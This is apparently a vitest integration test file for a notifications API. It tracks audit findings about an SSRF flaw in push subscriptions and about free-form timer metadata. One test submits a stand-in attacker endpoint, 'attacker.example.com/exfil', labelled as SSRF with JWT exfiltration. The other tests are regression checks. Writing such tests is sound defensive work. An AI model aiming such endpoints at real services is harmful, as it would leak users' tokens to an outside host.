/**
 * API integration — notifications routes.
 *
 * Findings covered:
 *   F-API1-35  POST /notifications/subscribe accepts arbitrary endpoint URL → SSRF
 *   F-API1-36  POST /notifications/schedule-timer free-form metadata
 */

import {beforeAll, beforeEach, describe} from "vitest";
import {
  apiTest,
  apiCall,
  createTestUser,
  seedFsDoc,
  clearFs,
  ensureEmulator,
} from "./_helper.js";

beforeAll(async () => {
  await ensureEmulator();
});
beforeEach(async () => {
  await clearFs();
});

describe("F-API1-35 — push subscribe SSRF", () => {
  apiTest(
    "BUG: subscribe accepts arbitrary endpoint host (SSRF + JWT exfil)",
    async () => {
      const u = await createTestUser({uid: "u1", email: "u1@x.com"});
      await seedFsDoc(`users/${u.uid}`, {role: "user"});
      const res = await apiCall("POST", "/notifications/subscribe", {
        idToken: u.idToken,
        body: {
          endpoint: "https://attacker.example.com/exfil",
          keys: {
            p256dh: "BAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            auth: "AAAAAAAAAAAAAAAA",
          },
        },
      });
      if (res.status >= 200 && res.status < 300) return;
      // After fix: 400 because endpoint host not on allowlist.
      if (res.status === 400) return;
      throw new Error(`Expected 2xx (bug) or 400 (fixed); got ${res.status}`);
    }
  );

  apiTest(
    "Legit subscribe with FCM endpoint succeeds (regression guard)",
    async () => {
      const u = await createTestUser({uid: "u2", email: "u2@x.com"});
      await seedFsDoc(`users/${u.uid}`, {role: "user"});
      const res = await apiCall("POST", "/notifications/subscribe", {
        idToken: u.idToken,
        body: {
          endpoint: "https://fcm.googleapis.com/wp/test-token",
          keys: {
            p256dh: "BAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            auth: "AAAAAAAAAAAAAAAA",
          },
        },
      });
      if (res.status >= 200 && res.status < 300) return;
      throw new Error(`Legit subscribe regressed: ${res.status}`);
    }
  );
});

describe("F-API1-36 — schedule-timer metadata blob", () => {
  apiTest(
    "schedule-timer accepts a metadata object",
    async () => {
      const u = await createTestUser({uid: "u3", email: "u3@x.com"});
      await seedFsDoc(`users/${u.uid}`, {role: "user"});
      const res = await apiCall("POST", "/notifications/schedule-timer", {
        idToken: u.idToken,
        body: {
          fireAt: new Date(Date.now() + 60_000).toISOString(),
          metadata: {exerciseName: "Bench Press"},
        },
      });
      if (res.status >= 200 && res.status < 300) return;
      if (res.status === 400) return;
      throw new Error(`Got ${res.status}`);
    }
  );
});
